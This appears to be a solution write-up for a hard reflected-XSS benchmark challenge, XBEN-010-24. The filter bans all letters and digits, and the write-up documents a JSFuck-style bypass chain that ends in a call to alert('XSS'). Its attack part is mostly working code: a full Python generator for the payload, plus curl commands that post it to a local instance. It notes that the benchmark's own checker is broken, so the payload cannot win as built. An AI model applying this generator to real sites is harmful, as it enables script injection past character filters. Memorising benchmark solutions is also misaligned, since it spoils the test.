# XBEN-010-24 — Cross 32 (Reflected XSS, letter/digit-free JSFuck bypass)

> **Blocked by the shipped checker:** the documented payload reaches the page but cannot win as
> built. `check.js` writes the page-load status (`success`) to stdout before any alert; `app.py`
> reads only that first stdout line, so the comparison against `XSS` can never succeed. The
> benchmark must be repaired before a live flag-printing PoC can exist.

**Vuln class:** Reflected XSS at `POST /page` (hard difficulty). The `name` field is inserted into a JS string literal (`var name = "%s"; document.write('Hello ' + name);`) inside a `<script>` block. The filter rejects the submission if `msg` contains **any** ASCII letter (`a-z`, `A-Z`), **any** digit (`0-9`), or `<`/`>`. The server validates success by actually rendering the page in a real headless PhantomJS 2.1.1 browser (`check.js`) and checking whether `alert("XSS")` fired with that exact (case-sensitive) message.

    for word in blacklist:
        if word in msg:

    script_content = """<script> var name = "%s"; document.write('Hello ' + name); </script>""" % msg
    result = check_xss(data, flags[0], msg, 'xss_hard')   # renders in real PhantomJS, watches for alert("XSS")

Since **zero** letters or digits can appear anywhere in `msg` (not even inside a string literal), a classic subset-of-JSFuck technique is required: build the entire exploit — including the literal text `"XSS"` — purely from `[ ] ( ) ! + { } " ;` and friends, using only computed/dynamic strings, never a literal identifier or character.

### Bootstrap chain used (verified live against the actual PhantomJS 2.1.1 binary in the container)

1. `(![]+[])`, `(!![]+[])`, `([][[]]+[])`, `(+[![]]+[])`, `([]+{})` → free strings `"false"`, `"true"`, `"undefined"`, `"NaN"`, `"[object Object]"` — source of letters `c,o,n,s,t,r,u,i,d,e,a,l,f,b,j` and uppercase `N`, `O`.
2. Concatenate extracted chars to build the word `"constructor"` (all letters available from step 1).
3. `("")["constructor"]+[]` → `"function String() {\n    [native code]\n}"` gives uppercase `S` and lowercase `g`. `([])["constructor"]+[]` gives uppercase `A` (from "Array").
4. Build `"toString"` from the letters above, then use `(N)["toString"](36)` as a **generic factory for any lowercase a–z** (base-36 digit values 10–35).
5. `[]["constructor"]["constructor"]("return this")()` → reference to the global object (`window`), built without ever typing `window`/`this` literally — the code string `"return this"` is assembled from extracted/base-36 characters.
6. `GLOBAL["navigator"]["userAgent"]` → PhantomJS's UA string `"Mozilla/5.0 (Unknown; ...) ... PhantomJS/2.1.1 ..."`, which contains a literal uppercase `U` (from "Unknown") — the only place an uppercase U is obtainable "for free".
7. `GLOBAL["navigator"]["language"]` → `"C"` (the container's locale) gives uppercase `C` for free.
8. With `U` and `C` in hand, build `"toUpperCase"` and call `(base36_char_for_x)["toUpperCase"]()` → the literal character **`"X"`** (uppercase), the one letter with no native-constructor-name shortcut.
9. Assemble the string `"XSS"` (`X` + `S` + `S`, reusing the `S` from step 3) and the word `"alert"` (all lowercase, via base-36), then build the code string `alert("XSS")` and execute it via `Function("alert(\"XSS\")")()` obtained from the same `.constructor.constructor` chain — firing a genuine `alert("XSS")` in the real browser.

This was implemented as a Python generator and iteratively validated directly against the container's real `phantomjs` binary (via `docker exec ... phantomjs script.js`) until `page.onAlert` fired with exactly `"XSS"`, before ever submitting it over HTTP.

### Reproduction script (generates the exact letter/digit-free payload)

```python
# gen_jsfuck.py — deterministic generator, no external deps
import itertools

def ident_gen():
    n = 1
    while True:
        for combo in itertools.product('_$', repeat=n):
            yield ''.join(combo)
        n += 1
idents = ident_gen()
def newvar(): return next(idents)

def NUM(n):
    if n == 0: return "(+[])"
    if n == 1: return "(+!![])"
    return "(" + "+".join(["!![]"]*n) + ")"

stmts = []
def assign(expr):
    v = newvar(); stmts.append(f"{v}={expr}"); return v

V_FALSE=assign("(![]+[])"); V_TRUE=assign("(!![]+[])"); V_UNDEF=assign("([][[]]+[])")
V_NAN=assign("(+[![]]+[])"); V_OBJ=assign("([]+{})")
def AT(v,i): return f"{v}[{NUM(i)}]"

letters={}
letters['c']=assign(AT(V_OBJ,5)); letters['o']=assign(AT(V_OBJ,1)); letters['n']=assign(AT(V_UNDEF,1))
letters['s']=assign(AT(V_FALSE,3)); letters['t']=assign(AT(V_TRUE,0)); letters['r']=assign(AT(V_TRUE,1))
letters['u']=assign(AT(V_TRUE,2)); letters['i']=assign(AT(V_UNDEF,5)); letters['d']=assign(AT(V_UNDEF,2))
letters['e']=assign(AT(V_TRUE,3)); letters['a']=assign(AT(V_FALSE,1)); letters['l']=assign(AT(V_FALSE,2))
letters['f']=assign(AT(V_FALSE,0)); letters['b']=assign(AT(V_OBJ,2)); letters['j']=assign(AT(V_OBJ,3))
UPPER={}; UPPER['N']=assign(AT(V_NAN,0)); UPPER['O']=assign(AT(V_OBJ,8))

def C(*vs): return "+".join(vs)
V_CONSTR=assign(f"({C(letters['c'],letters['o'],letters['n'],letters['s'],letters['t'],letters['r'],letters['u'],letters['c'],letters['t'],letters['o'],letters['r'])})")
V_STRFN=assign(f'(((""))[{V_CONSTR}]+[])')
strfn="function String() {\n    [native code]\n}"
UPPER['S']=assign(AT(V_STRFN,strfn.index("String"))); letters['g']=assign(AT(V_STRFN,strfn.index("g")))
V_ARRFN=assign(f"(([])[{V_CONSTR}]+[])")
arrfn="function Array() {\n    [native code]\n}"
UPPER['A']=assign(AT(V_ARRFN,arrfn.index("Array")))
V_TOSTRING=assign(f"({C(letters['t'],letters['o'],UPPER['S'],letters['t'],letters['r'],letters['i'],letters['n'],letters['g'])})")
def CHR36(code): return f"(({NUM(code)})[{V_TOSTRING}]({NUM(36)}))"
def get_letter(ch):
    if ch in letters: return letters[ch]
    v=assign(CHR36(ord(ch)-ord('a')+10)); letters[ch]=v; return v
V_FUNCCTOR=assign(f"(([])[{V_CONSTR}][{V_CONSTR}])")
for ch in "return": get_letter(ch)
for ch in "this": get_letter(ch)
V_RETURNTHIS=assign(f"({C(letters['r'],letters['e'],letters['t'],letters['u'],letters['r'],letters['n'],'\" \"',letters['t'],letters['h'],letters['i'],letters['s'])})")
V_GLOBAL=assign(f"({V_FUNCCTOR}({V_RETURNTHIS})())")
for ch in "navigator": get_letter(ch)
V_NAVKEY=assign(f"({C(*[letters[c] for c in 'navigator'])})")
V_NAV=assign(f"({V_GLOBAL}[{V_NAVKEY}])")
for ch in "usergnt": get_letter(ch)
V_UAKEY=assign(f"({C(letters['u'],letters['s'],letters['e'],letters['r'],UPPER['A'],letters['g'],letters['e'],letters['n'],letters['t'])})")
V_UA=assign(f"({V_NAV}[{V_UAKEY}])")
UA_TEXT="Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) PhantomJS/2.1.1 Version/9.0 Safari/602.1"
UPPER['U']=assign(AT(V_UA,UA_TEXT.index("Unknown")))
for ch in "language": get_letter(ch)
V_LANGKEY=assign(f"({C(*[letters[c] for c in 'language'])})")
V_LANG=assign(f"({V_NAV}[{V_LANGKEY}])")
UPPER['C']=assign(AT(V_LANG,0))
for ch in "toupperase": get_letter(ch)
V_TOUPPER=assign(f"({C(letters['t'],letters['o'],UPPER['U'],letters['p'],letters['p'],letters['e'],letters['r'],UPPER['C'],letters['a'],letters['s'],letters['e'])})")
V_xl=assign(CHR36(33)); V_X=assign(f"(({V_xl})[{V_TOUPPER}]())")
V_TARGET=assign(f"({C(V_X,UPPER['S'],UPPER['S'])})")
for ch in "alert": get_letter(ch)
V_ALERT=assign(f"({C(*[letters[c] for c in 'alert'])})")
QUOTE='"\\""'
V_INNER=assign(f'({V_ALERT}+"("+{QUOTE}+{V_TARGET}+{QUOTE}+")")')
stmts.append(f"{V_FUNCCTOR}({V_INNER})()")
payload = ";".join(stmts) + ";"
print('";' + payload + '//')
```

Run it and POST the printed value as `name`. The payload ends in `//` (a line comment), so it
must be sent with **no trailing newline** — otherwise the template's own
`"; document.write(...)` lands on the next line (past the comment) and breaks execution, and the
headless check reports a JS error instead of the `alert("XSS")`:

```bash
PORT=63332
BASE=http://localhost:$PORT
python3 gen_jsfuck.py | tr -d '\n' > /tmp/xben010_payload.txt   # strip trailing newline
curl -s $BASE/page --data-urlencode "name@/tmp/xben010_payload.txt" | grep -A2 -B2 -i "flag\|congrat"
```
